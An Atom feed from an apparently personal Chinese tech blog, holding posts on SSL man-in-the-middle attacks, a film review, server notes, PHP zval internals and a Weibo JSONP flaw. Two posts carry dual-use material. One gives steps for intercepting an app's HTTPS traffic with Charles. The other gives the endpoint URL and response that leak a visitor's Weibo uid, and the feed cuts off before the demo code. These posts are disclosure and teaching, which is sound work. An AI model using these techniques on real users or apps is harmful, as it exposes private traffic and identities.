<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[My Personal Blog]]></title>
  <link href="http://JiajunYao.github.com/atom.xml" rel="self"/>
  <link href="http://JiajunYao.github.com/"/>
  <updated>2013-08-31T16:18:56+08:00</updated>
  <id>http://JiajunYao.github.com/</id>
  <author>
    <name><![CDATA[jjyao]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Is SSL Security of Your App Rock Solid]]></title>
    <link href="http://JiajunYao.github.com/blog/2013/07/31/is-ssl-security-of-you-app-rock-solid/"/>
    <updated>2013-07-31T20:32:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2013/07/31/is-ssl-security-of-you-app-rock-solid</id>
    <content type="html"><![CDATA[<p>SSL(Secure Sockets Layer)是目前广泛用来加密网络通信的加密协议。它的一个著名应用就是HTTPS，也就是对HTTP通信使用SSL加密协议加密从而使得HTTP通信更加安全。对于一个移动应用（其他类型的客户端也同理），为了保证其和服务器的通信安全，开发者就会使用SSL来加密客户端和服务器之间的通信。这样理应是安全的，但由于很多开发者使用方式不对，导致客户端和服务器之间的SSL通信会受到中间人攻击(Man-in-the-middle attack)，从而使得安全性荡然无存。本文将首先简要介绍下SSL的原理和中间人攻击的原理，然后会提供一个中间人攻击的实例，最后本文介绍该如何防止中间人攻击。</p>

<!-- more -->


<h2>SSL原理</h2>

<p>SSL加密本质上就是用一个只有客户端和服务器知道的对称密钥加密网络上的数据包以达到保密的目的。在这里最主要的问题是如何产生<strong>只有</strong>客户端和服务器知道的对称密钥，SSL协议解决这个问题的过程被称为SSL的握手(handshake)。下面就简要描述下客户端和服务器建立了socket连接后SSL握手的过程（这是个简化版的描述，详细内容可见本文给出的参考资料）：</p>

<ol>
<li>客户端向服务器发送一个ClientHello消息（明文），包括了客户端支持的一系列加密算法、压缩算法和一个随机数(ClientRandom)。</li>
<li>服务器接收到ClientHello后就可以知道客户端支持哪些加密算法和压缩算法，然后服务器就可以选择一个客户端和服务器都支持的加密算法和压缩算法来作为接下来SSL连接中要使用的算法。选择好算法后服务器向客户端发送一个ServerHello消息（明文），包括了选择好的加密算法、压缩算法和一个随机数(ServerRandom)。</li>
<li>发送完ServerHello消息后，服务器紧接着又发送了一个Certificate消息（明文），包括了服务器的证书。这个证书是由CA颁发用来验证服务器身份的，里面包含了服务器的公钥等信息。</li>
<li>发送完Certificate消息后，服务器又发送了一个ServerHelloDone消息（明文），这是一个空的消息，表明服务器已经发送了这阶段要发送的全部信息，等待客户端的反馈。</li>
<li>客户端验证服务器证书的有效性，如果确认有效那么客户端会向服务器发送一个ClientKeyExchange消息（密文），这个消息由服务器证书中提供的公钥加密，包括了一个PreMasterSecret。PreMasterSecret是一个48字节的值，由两个版本号字节以及46个随机产生的字节组成，可以将其看做是一个随机数。</li>
<li>服务器收到ClientKeyExchange消息后用自己的私钥解密就可以得到PreMasterSecret。至此，客户端和服务器都拥有了三个随机数，分别是：ClientRandom, ServerRandom和PreMasterSecret。然后客户端和服务器都运行同一个密钥导出函数，将上述三个随机数作为input，产生的output中就包含了接下来用来加密应用数据的对称密钥。</li>
<li>发送完ClientKeyExchange消息后，客户端又发送了ChangeCipherSpec消息和Finished消息来表明客户端已结束握手过程。</li>
<li>最后服务器也发送了ChangeCipherSpec消息和Finished消息来表明服务器已结束握手过程。</li>
<li>到此为止整个SSL握手过程就结束了，接下来客户端和服务器就开始用握手阶段得到的对称密钥来加密应用数据。</li>
</ol>


<p>从上面描述的握手过程可以得知PreMasterSecret是一个<strong>只有</strong>客户端和服务器知道的值（因为它是客户端生成的，所以客户端知道。同时它是用服务器的公钥加密后传给服务器的，所以只有服务器手上的私钥能够解密）。而PreMasterSecret是产生对称密钥的一个input，由于input只有客户端和服务器知道，因此产生的output也就是对称密钥就只有客户端和服务器知道了，所以使用SSL来加密通信数据是安全的。有人可能会问那么ClientRandom和ServerRandom是用来干什么的呢（剧透：防止replay攻击）？使用SSL加密后的数据是无法被第三者解密了，但是又如何保证数据的完整性呢（剧透：使用MAC）？SSL是不是还能防止其他各类攻击（剧透：还能防止截断攻击等）？SSL不是用来加密数据的么，为什么还涉及数据压缩（剧透：压缩得在加密之前）？上述的握手过程只是一个简化版本，那么完整的握手过程又是怎样的呢（剧透：完整的握手可能还涉及到会话恢复和客户端认证等）？上述问题以及可能产生的其他关于SSL的疑问都可以在《SSL and TLS - Designing and Building Secure Systems》中找到答案，这本书写的非常好，值得一读（中文翻译的也还行）。</p>

<h2>中间人攻击原理</h2>

<p>中间人攻击的本质就是客户端以为它在和服务器通信，实际上它是在和中间人通信。服务器以为它在和客户端通信，实际上它也在和中间人通信。对于SSL来说，客户端和服务器都以为它们和对方建立了一条SSL连接，而实际上它们分别和中间人建立了一条SSL连接。这样的后果就是中间人能够得到客户端和服务器之间传输数据的明文，还能任意更改数据。下图是中间人攻击的示意图：</p>

<p><img src="http://JiajunYao.github.com/images/post/is-ssl-security-of-your-app-rock-solid/MITM.png"></p>

<p>在上图中Mallory就是中间人，在Alice（客户端）和Bob（服务器）建立SSL连接的过程中，Mallory截获Alice发出的ClientHello等消息，然后假装自己是Bob回应ServerHello等信息，这样Alice和Mallory之间就建立了一条SSL连接。同时Mallory假装自己是Alice，和Bob之间也建立了一条SSL连接。这样Alice发出的数据Mallory可以解密并修改，然后Mallory可以将数据通过它和Bob之间的SSL连接再传给Bob。而Bob的返回数据Mallory也可以解密并修改，然后再传给Alice。</p>

<p>从上面的描述可以看到中间人攻击的关键就是Alice把Mallory当成了Bob，而这实际上可以通过SSL握手过程中的验证服务器证书来避免的。只要Alice仔细检查收到的证书确实是Bob的，那中间人攻击就失效了。因为Mallory给Alice的一定是Mallory的证书，只有这样Mallory才有私钥来解密PreMasterSecret。假设Mallory给Alice的是Bob的证书，那么Mallory是没有Bob的私钥去解密PreMasterSecret的，也就说其不能得到对称密钥，自然也就无法解密Alice加密后的数据。</p>

<h2>中间人攻击实例</h2>

<p>很多App（客户端）的开发者没有正确地检查建立SSL连接时收到的服务器证书，从而使得中间人攻击成为了可能。我就对自己手机上装的一个App成功实施了中间人攻击，获取了它和服务器传输的内容，下面就简要介绍下攻击的过程：</p>

<ol>
<li>首先是在Mac上安装Charles，这是一个sniffer工具，支持中间人攻击。</li>
<li>然后配置iPhone和Mac，使得iPhone把Mac作为代理连接网络，这样Charles就有机会截获iPhone上发出的数据包了。</li>
<li>接着在iPhone上装Charles的根CA证书。Charles作为中间人发给客户端的是自己CA签署的证书，而这个CA不是iPhone默认认为的可信任CA，所以要手动把Clarese的CA加入可信任CA列表。</li>
<li>打开手机上的App，然后在Charles中就可以发现App发出的数据了（尽管App使用的是SSL连接）。</li>
</ol>


<p>更详细的做法请参见<a href="https://www.cocoanetics.com/2010/12/how-to-spy-on-the-web-traffic-of-any-app/">这里</a>。下面就给出几张攻击的截图：</p>

<p><img src="http://JiajunYao.github.com/images/post/is-ssl-security-of-your-app-rock-solid/example1.png"></p>

<p><img src="http://JiajunYao.github.com/images/post/is-ssl-security-of-your-app-rock-solid/example2.png"></p>

<p><img src="http://JiajunYao.github.com/images/post/is-ssl-security-of-your-app-rock-solid/example3.png"></p>

<p>从截图中可以看出我已经获得了这个应用和服务器传输的所有数据。</p>

<h2>防止中间人攻击</h2>

<p>为了防止中间人攻击，客户端需要检查SSL握手时获得的证书确实来自其想要连接的服务器。最简单的做法就是在客户端存放服务器的证书，然后每次建立SSL连接的时候都将远程获得的证书和本地的相比较，只有两者完全一样才认为没有受到中间人攻击，否则就应该拒绝建立连接。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Review on American Dreams in China]]></title>
    <link href="http://JiajunYao.github.com/blog/2013/06/16/review-on-american-dreams-in-china/"/>
    <updated>2013-06-16T11:35:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2013/06/16/review-on-american-dreams-in-china</id>
    <content type="html"><![CDATA[<p>这两天看了陈可辛导演的《中国合伙人》和柴静对新东方三位联合创始人的采访，感受颇多。创业奋斗路上风风雨雨，有太多的东西值得我们去学习，去感悟。下面就聊聊我所感悟到的东西：</p>

<ol>
<li>合伙人的品质</li>
<li>老大的品质</li>
<li>和比自己优秀的人在一起</li>
<li>老俞的安眠药</li>
</ol>


<!-- more -->


<h2>合伙人的品质</h2>

<p>创业之艰辛困难，非一人之力可以完成，必须依靠整个团队的努力，因此找到优秀的合伙人就非常重要。从电影和采访中可以看出俞敏洪找到了两位非常优秀的合伙人，共同奠定了新东方的基业。王强和徐小平所具有的合伙人品质值得所有想要创业的人去了解，对于像俞敏洪这样位置的人可以参考这些品质去选择自己的合伙人，而对于想要成为合伙人的人则可以从中寻找可以借鉴的品质，使自己成为一名优秀的合伙人。首先王强和徐小平自身的个人能力非常出众，这也就成功避免了猪队友的问题，同时他们的能力能和俞敏洪的互补，达到1+1>2的效果，这个对我们的启发就是在找合伙人的时候，一定要选优秀有能力的人才，这样才能促进公司的发展。当然在选择普通员工的时候也需要坚守同样的标准，一定要宁缺毋滥。另外王强和徐小平会尽一切努力去帮助俞敏洪管理好新东方。如果俞敏洪是刘备的话，那么王强和徐小平就是辅佐他的诸葛亮。徐小平在采访中说过他在新东方的使命就是要指导俞敏洪、批判俞敏洪，改造俞敏洪。尽管在这个过程中有争吵、有冲突、有对抗，但是最终的目的始终没有变过那就是帮助俞敏洪把新东方做的更好。正是三人齐心协力，才有了新东方的巨大成功。也就是说合伙人要有共同的目标，不能各怀心思，只有这样才能力往一处使，才能获得成功。</p>

<h2>老大的品质</h2>

<p>合伙人有合伙人应有的品质，而老大也需要有一些特殊的品质。俞敏洪这样一位新东方的老大，身上的品质也同样值得所有想要创业的人去了解。首先俞敏洪懂得寻找优秀的人才并能管理他们，他知道新东方要成功靠的不是他一个人而是一群人。新东方的明星教师很多，有罗永浩、陈虎平和杜昶旭等，这些人共同铸就了新东方的辉煌。和俞敏洪相反的就是李阳，他虽然能力很强，但不善于吸收优秀人才，有点个人英雄主义，他的疯狂英语没听说有什么著名教师（除了他自己）。这两者的差别在一定程度上造成了新东方和李阳疯狂英语在英语教育领域截然不同的地位。从这可以看出，作为老大需要有吸收和管理人才的能力，一个充满战斗力的团队（而不是个人）才是成功的关键。另外俞敏洪能忍，有承受能力。一方面他能忍受王强和徐小平对他的尖锐批评，这是需要一定胸怀的，一般人不一定能够承受的住。但就像采访中王强所说的那样“大家的怨气其实不是怨气是期望”，俞敏洪需要承受大家对他的期望，并努力提升自己以达到众人的期望。如果达不到大家的期望，俞敏洪又怎么能够领导他们呢？另一方面俞敏洪也要忍受创业中作为老大所面临的种种压力。采访中提到俞敏洪的家摆了一排安眠药的瓶子，他长期失眠，从这个侧面可以看出在创业过程中俞敏洪承受的巨大精神压力。另外徐小平也提到当时在新东方骂完老俞后自己就回家睡觉了，睡不着是老俞的事，而现在他自己做了老大，失眠的就是他了，由此可见老大的压力是巨大的。采访中还提到股东们轮流坐庄体会完老大的滋味后，没人愿意干了，俞敏洪又被请了回来，可见当老大可不是件轻松的事情。从俞敏洪忍受的这些压力来看，他拿45%的股份而王强和徐小平各拿10%也是很合理的，因为他们所承受的不一样。从这可以看出作为老大要能忍，要能忍受团队成员对他的批评，要能忍受创业过程中的种种压力。</p>

<h2>和比自己优秀的人在一起</h2>

<p>不管是在电影中还是采访中，俞敏洪都被人认为是“农民”、“土鳖”，而王强和徐小平则才华横溢，光彩耀人。在北大读书的时候，俞敏洪就跟着两人学习。他虚心接受王强班长的教诲，当知道王强最近看过什么书后就会立即补上，深怕落下。在王强和徐小平面前，俞敏洪就是个学生，总是抱着学习的心态去向两人请教。这不就是我们常说的“和比自己优秀的人在一起”吗。在学习生活中，我们需要和比自己优秀的人在一起，这样可以拓宽我们的视野，激励我们努力奋斗。和比自己优秀的人在一起可以让我们有机会聆听他们的教诲，这会让我们受益匪浅。和比自己优秀的人在一起可以让我们近距离观察他们，从而有机会发现他们身上的优良品质并获得它们。和比自己优秀的人在一起可以有效地防止成为井底之蛙，让我们清楚地认识到天外有天，人外有人。有了这种清醒的认识之后，我们就不会有自负的心理，就能静下心来努力学习，向这些比我们优秀的人看齐。但与此同时我们也需要调整心态防止自卑心理的产生，除了横向比较，我们更要纵向比较。和这些比自己优秀的人在一起后，虽然相对于他们自己仍是个“土鳖”，但是so what，只要自己本身有了成长和进步那就足够了。在生活中，还有一类人由于面子问题，不愿意承认别人比自己优秀，不愿放下面子虚心向别人学习，这时想想老俞就行了，他能虚心向王强和徐小平学习，能承认自己是“土鳖”，我们为什么不可以？</p>

<h2>老俞的安眠药</h2>

<p>人们往往只注意到那些成功人士（每个人对成功的定义不同，在这里姑且指那些创业成功的人吧）人前风光的一面，而没有看到他们背后付出的艰辛。就比如说人们往往只看到老俞在万千大学生面前做人生导师的风光，却没有看到他背后那一排安眠药。当然这个还能延伸到其他方面，比如人们往往只看到学霸那恐怖的成绩，却没有看到他们那日日夜夜蹲图书馆的日子。再比如人们往往只看到就业之星那令人羡慕的offer，却没有看到他们多年来为之做出的准备。很多人看到那些成功人士很是羡慕，都想要成为他们那样的人，但他们不知道要想成为这些成功人士，要付出多少的艰辛。所以当我们看那些成功人士时，除了要看他们表面的风光，还要特别留意他们背后的那排安眠药。当我们想要创业时，要想想我们已经准备好吃下老俞的安眠药了吗。</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Review LightMail Server Development]]></title>
    <link href="http://JiajunYao.github.com/blog/2013/05/08/review-lightmail-server-development/"/>
    <updated>2013-05-08T18:02:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2013/05/08/review-lightmail-server-development</id>
    <content type="html"><![CDATA[<ul>
<li>文档一定要看全，要仔细看，静下心来看，直到把所有的细节都弄明白。现在弄多了碎片阅读后，产生了阅读障碍，对大篇幅的技术文档没有耐心读完。</li>
<li>在服务器端, 高并发，I/O bound的程序，异步编程比同步编程有巨大的优势，虽然说写出来的代码可能比较难阅读。</li>
<li>Openssl会占很多内存，MODE_RELEASE_BUFFERS可以减少一点内存的使用</li>
<li>编写daemon程序一定要做好十足的错误处理，daemon进程是不能跪的</li>
<li>能用编写良好的第三方库的时候就不要自己写</li>
<li>不能把EC2当做Linode用，要看使用说明书</li>
</ul>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[A Close Look Into PHP zval]]></title>
    <link href="http://JiajunYao.github.com/blog/2013/03/17/a-close-look-into-php-zval/"/>
    <updated>2013-03-17T13:43:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2013/03/17/a-close-look-into-php-zval</id>
    <content type="html"><![CDATA[<p>最近研究了一下PHP variable的内部实现也就是zval，以及引申出来的Copy on Write, Reference等概念和机制。为了检验一下我是不是真的弄懂了，一个好的方法就是看能不能把它清楚地写下来并让人能够读懂。</p>

<!-- more -->


<h2>什么是zval</h2>

<p>简单的来说zval就是PHP variable的value在低层C的表示。大家都知道PHP主要是用C语言来写的，于是所有东西应该都有一个C的对应，PHP variable的value对应就是zval struct。首先先来看一下zval struct的定义：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">union</span> <span class="p">{</span>
</span><span class='line'>        <span class="kt">long</span> <span class="n">lval</span><span class="p">;</span>
</span><span class='line'>        <span class="kt">double</span> <span class="n">dval</span><span class="p">;</span>
</span><span class='line'>        <span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>            <span class="kt">char</span> <span class="o">*</span><span class="n">val</span><span class="p">;</span>
</span><span class='line'>            <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span> <span class="n">str</span><span class="p">;</span>
</span><span class='line'>        <span class="n">HashTable</span> <span class="o">*</span><span class="n">ht</span><span class="p">;</span>
</span><span class='line'>        <span class="n">zend_object_value</span> <span class="n">obj</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span> <span class="n">value</span><span class="p">;</span>
</span><span class='line'>    <span class="n">zend_uint</span> <span class="n">refcount</span><span class="p">;</span>
</span><span class='line'>    <span class="n">zend_uchar</span> <span class="n">type</span><span class="p">;</span>
</span><span class='line'>    <span class="n">zend_uchar</span> <span class="n">is_ref</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">zval</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>接下来我们就从最简单的开始，逐一解释一下各个字段的含义。</p>

<h3>type</h3>

<p>首先是<code>type</code>字段，这个顾名思义就是表示PHP variable是什么类型的。由于PHP是动态类型语言，因此需要这个字段来标识，同时根据这个字段可以判断出<code>value</code>字段里的值到底是什么。</p>

<h3>value</h3>

<p><code>value</code>字段存放的是PHP variable的值，可以看出这是个union类型，也就是说这个字段可以有多种解释，关键看<code>type</code>的值是什么，这不就有点像多态么。接下里我们就看看<code>type</code>和<code>value</code>的对应关系是什么：</p>

<table>
<thead>
<tr>
<th align="center">PHP variable type </th>
<th align="center"> zval value            </th>
<th align="center"> Notes</th>
</tr>
</thead>
<tbody>
<tr>
<td align="center">Long              </td>
<td align="center"> long lval             </td>
<td></td>
</tr>
<tr>
<td align="center">Double            </td>
<td align="center"> double dval           </td>
<td></td>
</tr>
<tr>
<td align="center">String            </td>
<td align="center"> struct{…} str         </td>
<td></td>
</tr>
<tr>
<td align="center">Resource          </td>
<td align="center"> long lval             </td>
<td align="center"> 存放的只是resource的identifier,而不是resource本身</td>
</tr>
<tr>
<td align="center">Boolean           </td>
<td align="center"> long lval             </td>
<td align="center"> 0表示FALSE，1表示TRUE</td>
</tr>
<tr>
<td align="center">Array             </td>
<td align="center"> HashTable *ht         </td>
<td align="center"> PHP的很多东西都是用HashTable来实现的</td>
</tr>
<tr>
<td align="center">Ojbect            </td>
<td align="center"> zend_object_value obj </td>
<td></td>
</tr>
<tr>
<td align="center">NULL              </td>
<td align="center">                       </td>
<td align="center"> NULL本身也是一种类型，但它不需要使用<code>value</code>字段</td>
</tr>
</tbody>
</table>


<p>其中Long, Double, String, Boolean, NULL应该是很清晰了，用zval可以完全表示，略复杂一点的是Object,Array和Resource。在这里我们就只讨论Ojbect和Array。</p>

<h4>Object</h4>

<p>从上面的对应表可以看出Object的value是用<code>zend_object_value</code>这个struct来表示的，我们就看看这个struct的定义：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">zend_object_handle</span> <span class="n">handle</span><span class="p">;</span>
</span><span class='line'>    <span class="n">zend_object_handlers</span> <span class="o">*</span><span class="n">handlers</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span> <span class="n">zend_object_value</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>在这里要说明的是一个ojbect的data并不是直接存放在zend_object_value里面的，而是放在object store中，也就是说每个object都有一个对应的object store（这应该也是用HashTable来实现的吧），里面放着object的data，也就是object属性的值，这些值本身也是一个个的zval。接下里PHP要做的就是建立object和object store的一一对应关系，而这个就是通过<code>zend_object_handle handle</code>来实现的，这是一个long值，相当于object store的identifier,通过这个<code>handle</code>就可以找到object的data在那里了。而<code>zend_object_handlers *handlers</code>指向了一些处理函数，比如用来访问object属性的函数等等，这个在这里就不再详述了，有兴趣的可以看<a href="https://wiki.php.net/internals/engine/objects">这里</a>。讲到这里，我们应该知道了对于object的zval来说本身并没有存放object的data，而只是存放了一个整数型的handle。认识到这一点很重要，因为这会对接下来讨论的copy by reference和copy by value产生直接的影响。</p>

<h4>Array</h4>

<p>PHP的Array是用HashTable来实现的，通过这个就可以存放Array中的Key-Value了。关于这个HashTable具体是如何实现的，可以看<a href="http://nikic.github.com/2012/03/28/Understanding-PHPs-internal-array-implementation.html">这里</a>。我根据那个tutorial画了个示意图如下：</p>

<p><img src="http://JiajunYao.github.com/images/post/a-close-look-into-php-zval/zval.6.png"></p>

<p>在这里我们要知道的是Key-Value中的value也就是一个个的zval，就和object的属性值一样，HashTable中就存放着指向这些zval的指针。</p>

<h3>refcount &amp; if_ref</h3>

<p>看完了<code>type</code>和<code>value</code>字段，接下来就看看<code>refcount</code>和<code>if_ref</code>字段，这两个字段关系到gc,关系到copy by value和copy by reference，所以非常重要，需要仔细讲解。<code>refcount</code>表明当前有多少个variable指向了这个zval，这个信息就可以用来gc，当<code>refcount</code>变为0后，这个zval就可以被回收。<code>if_ref</code>表明当前指向这个zval的variable是不是reference。在PHP中一个variable可以是value type就像这样<code>$b = $a</code>或者是reference type就像这样<code>$b = &amp;$a</code>。在语义上这两者是不同的，因此也就拥有不同的行为，我们首先要区分这两种类型的variable，这个通过代码解释最好不过了。</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='PHP'><span class='line'><span class="x">$a = &#39;hello&#39;;</span>
</span><span class='line'><span class="x">$b = $a; // $b is value type</span>
</span><span class='line'><span class="x">$a = &#39;world&#39;;</span>
</span><span class='line'><span class="x">var_dump($a); // &#39;world&#39;</span>
</span><span class='line'><span class="x">var_dump($b); // &#39;hello&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="x">$a = &#39;hello&#39;;</span>
</span><span class='line'><span class="x">$b = &amp;$a; // $b is reference type</span>
</span><span class='line'><span class="x">$a = &#39;world&#39;;</span>
</span><span class='line'><span class="x">var_dump($a); // &#39;world&#39;</span>
</span><span class='line'><span class="x">var_dump($b); // &#39;world&#39;</span>
</span></code></pre></td></tr></table></div></figure>


<p>从上面一段代码可以看出如果$b是value type的话，它的值并不会随着$a的改变而改变，就好像在执行<code>$b = $a</code>时，<code>$a</code>的值(zval)被复制了一份，也就是说<code>$a</code>和<code>$b</code>拥有自己独立的zval，两者互不影响。而如果是reference type的话，就如同<code>$a</code>和<code>$b</code>共用了一个zval，不管是改变<code>$a</code>，还是<code>$b</code>，其实都是改变一个zval。但事实没有这么简单，如果真像上面所说的那样执行<code>$b = $a</code>时，zval复制了一份，那么效率也太低了，因为有可能<code>$b</code>和<code>$a</code>在接下来的使用过程中都是只读的，它们本可以共用一个zval而不会出问题。那么PHP究竟是如何实现的呢，答案就是通过<code>refcount</code>和<code>if_ref</code>实现了copy on write机制。而这个copy on write机制对于不同<code>type</code>的变量也会有些不同的表现，接下来我们就通过一系列的图例来理解这个机制。</p>

<p><img src="http://JiajunYao.github.com/images/post/a-close-look-into-php-zval/zval.1.png">
<img src="http://JiajunYao.github.com/images/post/a-close-look-into-php-zval/zval.2.png">
<img src="http://JiajunYao.github.com/images/post/a-close-look-into-php-zval/zval.3.png"></p>

<p>前两张图大家应该很好理解，可以清楚的看到copy on write的发生并可以看到<code>if_ref</code>和<code>refcount</code>的作用，PHP正是依赖于<code>if_ref</code>和<code>refcount</code>来决定是否需要copy on write。而从第三张图中可以看到在没有<code>write</code>发生的情况下就发生了<code>copy</code>，而这是为什么呢，貌似<code>$a</code>、<code>$b</code>和<code>$c</code>可以共用一个zval的呀。原因其实很简单，那就是如果这三个变量共用一个zval那么<code>is_ref</code>的值就不知道该填什么了，<code>0</code>或<code>1</code>都不正确，因为这三个变量中既有value type又有reference type。如果<code>is_ref</code>为<code>0</code>那么<code>$a</code>和<code>$c</code>是reference关系这个信息就无法表达,PHP会认为<code>$a</code>、<code>$b</code>和<code>$c</code>是value type，改变其中任何一个的值并不会对另外两个造成影响，这显然不对。如果<code>is_ref</code>为<code>1</code>那么PHP会认为<code>$a</code>、<code>$b</code>和<code>$c</code>是reference type，改变其中任何一个的值都会反映在另外两个上，这显然也是不对的。综上所述在这种情况下只能copy出一份zval出来，这样才能保证接下来不管是操作<code>$a</code>、<code>$b</code>或者<code>$c</code>都不会出问题。之前的这三种图展示的是type为Long的variable的情况，而Boolean、Double、String和Long是一样的，就不再画出来了，而Array和Object比较复杂，情况也特殊，所以拿出来单独讨论。</p>

<p><img src="http://JiajunYao.github.com/images/post/a-close-look-into-php-zval/zval.4.png">
<img src="http://JiajunYao.github.com/images/post/a-close-look-into-php-zval/zval.5.png"></p>

<p>从上面两张图看出Array和Object的行为存在着显著的不同，Array拥有<code>by-value semantics</code>而Object拥有<code>by-reference semantics</code>。Array的表现更像之前提到的Long type，也会有Copy on Write行为，而它的Copy从上图中可以看出比较智能，只Copy那些必须的zval。而Object则不一样，不管是value type还是reference type，它们都共用一个object store，也就是说任何属性的值发生了变化，所有指向这个object的variable都能知道，就好像Copy on Write对Object不起作用了。为了强制Copy，最后执行了<code>$c = &amp;$a</code>这条语句，为什么这条语句能强制使zval copy一份的原理在上面已经讲过了，这里就不再复述。这里有趣的是zval确实copy了一份，但是两个zval还是指向了同一个object store，也就是说不管通过<code>$a</code>、<code>$b</code>或者<code>$c</code>改变了某个属性，这三个变量都能知道。那么zval的copy到底做了什么呢？还记得上面提到过<code>zend_object_value</code>中只是存放了一个整型的<code>handle</code>字段，而通过这个字段可以找到object store在哪，那么zval的copy也就只会将这个<code>handle</code>字段copy一份，于是两个zval中拥有同样的<code>handle</code>值，它们就当然指向了同一个object store。那么如何让Object发生像Array那样类似的Copy呢，PHP为此提供了<code>clone</code>关键字。</p>

<p>说到这差不多把zval给讲清楚了，同时也讲了一下Copy on Write机制，Value type和Reference type的区别。有了上面的解释，我们也应该能知道函数传参的Pass by Value和Pass by Reference的区别了，在这里就不多说了。如果有人想看更多类似我上面的图的话，可以看<a href="http://andrey.hristov.com/projects/php_stuff/Internals%20Exposed.pdf">这里</a>。如果有人想问我是怎么知道低层zval的变化的话，可以看<a href="http://www.php.net/manual/en/function.debug-zval-dump.php">这里</a>。最后还可以看看这个和zval有关的<a href="http://stackoverflow.com/questions/10057671/how-foreach-actually-works/">问题</a>。</p>

<h2>参考资料</h2>

<ol>
<li><a href="http://devzone.zend.com/317/extension-writing-part-ii-parameters-arrays-and-zvals/">Extension Writing Part II: Parameters, Arrays, and ZVALs</a></li>
<li><a href="http://blog.ircmaxell.com/2012/03/phps-source-code-for-php-developers_21.html">PHP&#8217;s Source Code For PHP Developers - Part 3 - Variables</a></li>
<li><a href="http://andrey.hristov.com/projects/php_stuff/Internals%20Exposed.pdf">Zend Engine 2 - Internals Exposed</a></li>
<li><a href="http://nikic.github.com/2012/03/28/Understanding-PHPs-internal-array-implementation.html">Understanding PHP&#8217;s internal array implementation (PHP&#8217;s Source Code for PHP Developers - Part 4 )</a></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Who Are You]]></title>
    <link href="http://JiajunYao.github.com/blog/2013/01/25/who-are-you/"/>
    <updated>2013-01-25T22:20:00+08:00</updated>
    <id>http://JiajunYao.github.com/blog/2013/01/25/who-are-you</id>
    <content type="html"><![CDATA[<p>这两天在研究新浪微博的第三方插件实现，无意中发现通过利用新浪微博的某个URL能让我获取当前访问这个URL的用户的微博uid。也就是说只要在某个网站中嵌入一段代码，这段代码在后台偷偷的的访问那个URL，然后就可以把访问这个网站的用户的微博uid获取到，于是隐私就被泄露了…… 也就是说一个网站可以知道有哪些微博用户访问了它，然后可以就此采取一系列的措施……<br/>
下面就具体讲讲这个漏洞是怎么回事。</p>

<!-- more -->


<h2>问题</h2>

<p>大家都知道微博会提供一些第三方插件(widget)用来放在其他网站上，其中有一个就是关注按钮。通过这个关注按钮用户就可以在第三方网站上直接关注某个人，如果当前访问用户已经关注过了，则该关注按钮会显示已关注。接下来我们就要看看在一个第三方的网站上新浪微博是怎样知道当前访问用户是否已经关注了某个账号，而这个涉及到<a href="http://en.wikipedia.org/wiki/Same_origin_policy">JavaScript跨域问题</a>。通过查看插件的js代码和浏览器的http请求，发现如果引入关注按钮插件的话会有如下的一个http请求：</p>

<pre><code>http://widget.weibo.com/public/aj_relationship.php?fuid=2991975565&amp;callback=STK_13591259816211
</code></pre>

<p>返回结果是：</p>

<pre><code>STK_13591259816211({"code":"100000","msg":"success","data":{"relation":3,"login":true,"uid":2369955640}})
</code></pre>

<p>从这个http请求来看新浪采用了<a href="http://en.wikipedia.org/wiki/JSONP">jsonp</a>技术来解决跨域问题。从返回结果猜测data.relation应该表明当前用户和fuid用户之间的关系，可能是是否关注fuid，是否双向关注等等。问题的关键是新浪把当前用户的uid也返回回来了，如果第三方网站能获取这个uid，就能知道当前访问用户是谁了。</p>

<h2>示例</h2>

<p>接下来我就写了一个demo来模拟这个过程。首先是先写一个第三方网页：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
